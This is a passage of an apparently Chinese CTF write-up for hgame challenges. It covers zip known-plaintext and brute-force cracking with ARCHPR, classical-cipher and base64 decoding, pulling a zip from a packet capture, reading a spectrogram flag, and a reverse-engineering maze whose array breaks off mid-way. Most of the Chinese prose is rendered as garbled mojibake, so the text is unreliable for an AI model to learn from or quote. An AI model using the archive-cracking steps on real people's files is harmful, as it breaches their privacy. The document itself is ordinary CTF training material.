å‹ç¼©åŒ…ã€‚</p><p>å…ˆå°†å·²ç»å¾—åˆ°å¾—Bacon.txtç”¨7zæ— å¯†ç å‹ç¼©å¾—åˆ°Bacon.zip</p><p>åˆ©ç”¨å·¥å…·ï¼šARCHPR</p><p>ä¸Šé¢æ”¾æœ‰å¯†ç å¾—å‹ç¼©åŒ…ï¼Œä¸‹é¢æ”¾è‡ªå·±åˆ¶ä½œå¾—å‹ç¼©åŒ…</p><p>å¼€å§‹æ”»å‡»ï¼Œ</p><p>ç­‰æœç´¢åˆ°å¯†é’¥åå°±å¯ä»¥æ‰‹åŠ¨æš‚åœï¼Œè·å¾—æ— å¯†ç çš„å‹ç¼©åŒ…</p><p>æœ‰è¿™ä¸ªå¯†é’¥å°±å¯ä»¥è·å¾—æ— å¯†ç çš„å‹ç¼©åŒ…äº†ï¼Œç‚¹ç¡®å®šå°±å¯ä»¥äº†ã€‚    </p><p>æ‰“å¼€wordï¼Œæç¤ºæœ‰å¯†ç ï¼Œå¯†ç æ˜¯ä»€ä¹ˆï¼Ÿåˆšåˆšæœ‰è§£å¯†è¿‡ä¸€ä¸ªåŸ¹æ ¹å¯†ç æƒ¹ï¼Œè¯•è¯•</p><p>æœ€åè¯•å‡ºæ¥æ˜¯å¤§å†™çš„é‚£ä¸ªï¼šFLAGHIDDENINDOC</p><p>æ‰“å¼€æ˜¯ä¸€ç¯‡æ–‡ç« </p><p>æ‹‰åˆ°åº•ä¹Ÿæ²¡å‘ç°ä¸œè¥¿ï¼Œ</p><p>ä»¥ä¸ºæ˜¯å°†flagè®¾ç½®æˆå’ŒèƒŒæ™¯ä¸€æ ·çš„ç™½è‰²ï¼Œäºæ˜¯å°†æ‰€æœ‰æ–‡å­—éƒ½æ”¹æˆçº¢è‰²ã€‚æ— æœ</p><p>æœ€åè¯•äº†è¯•è®¾è®¡æ¨¡å¼ï¼Œè¿™ä¸ªæ¨¡å¼ä¹Ÿå¯ä»¥è—äº›ä¿¡æ¯ï¼ˆä¹‹å‰çš„æ¯”èµ›é‡åˆ°è¿‡ï¼‰</p><p>æœç„¶~</p><p>å¾—åˆ°flagï¼šhgame {Y0u_h@Ve_F0Und_mY_S3cReT}</p><h3 id="ç­¾åˆ°æProPlus"><a href="#ç­¾åˆ°æProPlus" class="headerlink" title="ç­¾åˆ°æProPlus"></a>ç­¾åˆ°æProPlus</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-15"><a href="#é¢˜ç›®ä»‹ç»ï¼š-15" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>ä»€ä¹ˆä»€ä¹ˆï¼Œç­¾åˆ°é¢˜å¤ªç®€å•æ²¡è¿‡ç˜¾ï¼Ÿ<br>æ¥æ¥æ¥ï¼Œè¯•è¯•å’±ObjectNotFoundäº²æ‰‹åšçš„è¿™ä¸€é“ï¼ŒåŒ…æ‚¨æ»¡æ„ï¼<br>ã€æ‹¼å†™é”™è¯¯ä¿®æ­£ã€‘fenses -&gt; fences</p><h4 id="è§£é¢˜æ€è·¯ï¼š-15"><a href="#è§£é¢˜æ€è·¯ï¼š-15" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>æ‰“å¼€æ–‡ä»¶ï¼Œæœ‰ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…å’Œä¸€ä¸ªpassword.txtï¼Œ</p><p>æ–‡æœ¬å†…å®¹ä¸ºï¼š</p><p>Rdjxfwxjfimknâ€‚z,tsâ€‚wntziâ€‚xtjrwmâ€‚xsfjtâ€‚jmâ€‚ywtâ€‚rtntwhfâ€‚fâ€‚yâ€‚â€‚â€‚hâ€‚jnsxfâ€‚qjFjfâ€‚jnbâ€‚â€‚rgâ€‚fiyykwtbsnkmâ€‚tmâ€‚â€‚xaâ€‚jsdwqjfmkjyâ€‚wlviHtqzqsGsffywjjyynfâ€‚yssmâ€‚xfjypnyihjn.</p><p>JRFVJYFZVRUAGMAI</p><ul><li>Three fenses first, Five Caesar next. English sentense first,  zip password next.</li></ul><p>æ¨èä¸€ä¸ªç¼–ç è§£ç æ¯”è¾ƒå¥½çš„ç½‘ç«™ï¼š<a href="http://www.qqxiuzi.cn" target="_blank" rel="noopener">www.qqxiuzi.cn</a></p><p>ä¸‰æ¬¡æ …æ ï¼Œäº”æ¬¡å‡¯æ’’   è‹±è¯­å¥å­åœ¨å‰ï¼Œå‹ç¼©åŒ…å¯†ç åœ¨åï¼Œ</p><p>å…ˆå°†æ–‡æœ¬æ¯ç»„å­—æ•°ä¸º3æ …æ è§£å¯†åï¼Œå‡¯æ’’å¯†ç ä½ç§»5ä½è§£å¯†å¾—åˆ°</p><p> Manyâ€‚yearsâ€‚laterâ€‚asâ€‚heâ€‚facedâ€‚theâ€‚firingâ€‚squad,â€‚Colonelâ€‚Aurelianoâ€‚Buendiaâ€‚wasâ€‚toâ€‚rememberâ€‚thatâ€‚distantâ€‚afternoonâ€‚whenâ€‚hisâ€‚fatherâ€‚tookâ€‚himâ€‚toâ€‚discoverâ€‚ice. </p><p>ç™¾å¹´å­¤ç‹¬é‡Œçš„ä¸€æ®µï¼Œ</p><p>emmmï¼Œæ‰€ä»¥ä¸‹é¢é‚£ä¸ªJRFVJYFZVRUAGMAIæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ</p><p>English sentense first,  zip password next.</p><p>æ‰€ä»¥å°†è¿™ä¸€ä¸²æŒ‰åŒæ ·è§„åˆ™è§£å¯†å°±èƒ½å¾—åˆ°zipå¯†ç äº†ï¼Œ</p><p>è§£å¯†å¾—åˆ°ï¼š EAVMUBAQHQMVEPDT </p><p>ç”¨è¿™ä¸ªå¯†ç æ‰“å¼€å‹ç¼©åŒ…</p><p>æ˜¯ookï¼åŠ å¯†ï¼Œ<a href="https://www.splitbrain.org/services/ookè§£å¯†å¾—åˆ°base32ç¼–ç ï¼Œ" target="_blank" rel="noopener">https://www.splitbrain.org/services/ookè§£å¯†å¾—åˆ°base32ç¼–ç ï¼Œ</a></p><p>base32è§£ç å¾—åˆ°base64ç¼–ç ï¼Œbase64è§£ç å¾—åˆ°</p><p><img src="https://i.loli.net/2020/04/30/3r1lGqF2ubkRJV4.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œpngæ–‡ä»¶çš„æ–‡ä»¶å¤´PNGï¼Œ</p><p>äºæ˜¯ç”¨pythonï¼Œå°†base64è½¬ä¸ºå›¾ç‰‡</p><p>expï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">base=<span class="string">'    '</span> <span class="comment">#è¿™é‡Œæ˜¯ä¹‹å‰å¾—åˆ°çš„base64ç¼–ç </span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'flag.png'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.<span class="built_in">write</span>(base64.b64decode(base))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äºŒç»´ç -&gt;flagï¼š hgame{3Nc0dInG_@lL_iN_0Ne!} </p><h3 id="æ¯æ—¥æ¨è"><a href="#æ¯æ—¥æ¨è" class="headerlink" title="æ¯æ—¥æ¨è"></a>æ¯æ—¥æ¨è</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-16"><a href="#é¢˜ç›®ä»‹ç»ï¼š-16" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>â€œè¿™æ˜¯ä¸€ä¸ªï¼ŒE99p1antå’ŒObjectNotFoundä¹‹é—´å‘ç”Ÿçš„æ•…äº‹ã€‚â€<br>â€œäº‹æƒ…ï¼Œè¿˜è¦ä»ä¸€ä¸ªé£å’Œæ—¥ä¸½çš„ä¸‹åˆè¯´èµ·ã€‚ObjectNotFoundæ­£å¬ç€ç½‘æ˜“äº‘æ¯æ—¥æ¨èâ€¦â€<br>ç®—äº†ç®—äº†ï¼Œæƒ³ä¸å‡ºä»€ä¹ˆé¢˜ç›®ä»‹ç»äº†ï¼Œå°±è¿™æ ·å§ã€‚</p><h4 id="è§£é¢˜æ€è·¯ï¼š-16"><a href="#è§£é¢˜æ€è·¯ï¼š-16" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>ç”¨wiresharkæ‰“å¼€æµé‡åŒ…ï¼Œè¿½è¸ªTCPæµï¼Œ</p><p>åœ¨ç¬¬88æµå‘ç°å‡ºé¢˜äººä¸Šä¼ çš„å‹ç¼©åŒ…</p><p>dumpä¸‹æ¥ï¼Œè¿™é‡Œæä¾›ä¸€ç§æˆ‘çš„ç¨å¾®æ¯”è¾ƒéº»çƒ¦çš„æ–¹æ³•ï¼Œå¦‚æœæœ‰æ›´å¥½çš„æ–¹æ³•ï¼Œè¯·æŒ‡æ•™</p><p>é¦–å…ˆæ˜¾ç¤ºå’Œä¿å­˜æ•°æ®ä¸ºåŸå§‹æ•°æ®</p><p>ç„¶åæ–°å»ºä¸€ä¸ªç©ºçš„æ–‡æœ¬ï¼Œå°†è¿™äº›æ•°æ®å¤åˆ¶è¿›å»ï¼Œä¿å­˜</p><p>æ‰“å¼€010editorï¼Œå¯¼å…¥16è¿›åˆ¶æ–‡ä»¶ii</p><p>ç¼–è¾‘ä¸ºæ–‡æœ¬</p><p>åˆ æ‰å‹ç¼©åŒ…å‰é¢å’Œåé¢çš„æŠ¥æ–‡ï¼Œä¿å­˜æ–‡ä»¶ï¼Œåç¼€ä¸º.zip</p><p>æ‰“å¼€å‹ç¼©åŒ…ï¼Œæç¤ºå¯†ç ä¸º6ä½æ•°å­—</p><p>ARCHPRçˆ†ç ´ä¹‹ã€‚</p><p>æ‰“å¼€å¾—åˆ°ä¸€ä¸ªéŸ³é¢‘</p><p>I Love Mondays.mp3</p><p>å¬äº†ä¸€ä¸‹ï¼Œé‡Œé¢ç¡®å®æ˜¯åŸæ¥çš„æ›²ï¼Œ</p><p>ä¸€å¼€å§‹è§‰å¾—å¯èƒ½æ˜¯mp3éšå†™ï¼Œä½†æ˜¯æ‰¾ä¸åˆ°å¯†ç ï¼Œæœ€åè¿˜æ˜¯ç”¨Audacityæ‰“å¼€ï¼Œè¯•äº†è¯•</p><p>æ³¢å½¢å›¾ï¼Œ</p><p>æ— æœï¼Œ</p><p>è¯•äº†è¯•é¢‘è°±å›¾</p><p><img src="https://i.loli.net/2020/04/30/T1eRzlhCiGHym8b.png" alt="img"></p><p>å¾—åˆ°flagï¼šhgame{I_love_EDM233}</p><p>ï¼ˆå¥½å¥‡è¿™ç§é¢˜æ€ä¹ˆå‡ºçš„ï¼Œå‡ºé¢˜äººå¥½å¼º~ï¼‰</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-17"><a href="#é¢˜ç›®ä»‹ç»ï¼š-17" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p> You wonâ€™t figure out anything if you give in to fear.<br>å­¦ä¹ èµ„æ–™: <a href="https://ctf-wiki.github.io/ctf-wiki/reverse/maze/maze-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/reverse/maze/maze-zh/</a><br>é™„åŠ è¯´æ˜ï¼šè¯·èµ°æœ€çŸ­è·¯çº¿ </p><h4 id="è§£é¢˜æ€è·¯ï¼š-17"><a href="#è§£é¢˜æ€è·¯ï¼š-17" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>æ˜¯ä¸€ä¸ªæ­£å¸¸çš„èµ°è¿·å®«ï¼Œå…ˆçœ‹èµ°æ³•é‚£è¾¹çš„ä»£ç </p><p>è¿·å®«å°±åœ¨å›¾ä¸­çš„&amp;unk_602080ï¼Œ</p><p>ç»ˆç‚¹å°±æ˜¯å›¾ä¸­çš„&amp;unk_60243C.</p><p>æˆ‘ä»¬åœ¨idaé‡Œé¢æŠŠè¿·å®«dumpä¸‹æ¥</p><p>é€‰ä¸­è¿·å®«æ•°æ®æ®µ</p><p>shift+e</p><p>ä»åæ±‡ç¼–çš„ä»£ç æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸ªè¿·å®«æœ‰64åˆ—ï¼Œä½†æ˜¯å·¦å³ç§»åŠ¨ä¸€æ¬¡éƒ½æ˜¯ç§»åŠ¨å››ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠè¿·å®«å¤„ç†ä¸€ä¸‹ï¼Œ</p><p>æ¯å››åˆ—åªå–ç¬¬ä¸€åˆ—å·¦å³æœ‰æ•ˆåˆ—</p><h4 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h4><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">maze =[</span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span 